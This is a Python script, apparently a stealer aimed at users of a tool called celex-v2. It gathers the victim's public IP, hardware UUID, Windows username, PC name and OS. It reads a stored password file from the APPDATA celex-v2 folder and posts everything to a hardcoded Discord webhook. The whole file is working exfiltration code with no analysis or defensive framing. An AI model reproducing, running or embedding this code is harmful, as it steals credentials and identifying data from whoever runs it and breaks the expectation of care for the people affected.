import requests
import json
import subprocess
import os
import platform

# Define the webhook URL
webhook_url = "https://discord.com/api/webhooks/1234111356551172148/6mndk3OCMesaL3ZmzegMcSXXLT-gFilHKfMEh9ssJWt2nXK2PMaSd9HrY1HhDBE0JyBw"

# Get user IP address from the Amazon check IP service
user_ip = requests.get("https://checkip.amazonaws.com/").text.strip()

# Get hardware ID
hardwareid = subprocess.check_output('wmic csproduct get uuid').decode('utf-8').split('\n')[1].strip()

# Get server user and PC name from the environment variables
serveruser = os.getenv("UserName")
pc_name = os.getenv("COMPUTERNAME")

# Get operating system information using the platform module
os_name = platform.system() + " " + platform.release()

# Create a dictionary with the gathered data
data = {
    "content": f"WHOOPS someone is using uky.cc \n - \n Server User: {serveruser} \n User IP: ||{user_ip}|| \n Hardware ID: ||{hardwareid}|| \nPC Name: ||{pc_name}|| \nOS Name: ||{os_name}||"
}

# Define the file path for user.json
file_path = os.path.join(os.getenv('APPDATA'), 'celex-v2', 'user.json')

# Check if the file exists
if os.path.exists(file_path):
    # Read the contents of the file
    with open(file_path, 'r') as file:
        file_contents = file.read()

    # Add file contents to the data dictionary
    data["content"] += f"\n\ncelex password: ||{file_contents}||"

# Send the data to the Discord webhook
response = requests.post(
    webhook_url,
    data=json.dumps(data),
    headers={'Content-Type': 'application/json'}
)

# Debug: Print the status code and response text
print(f"Status Code: {response.status_code}")
print(f"Response Text: {response.text}")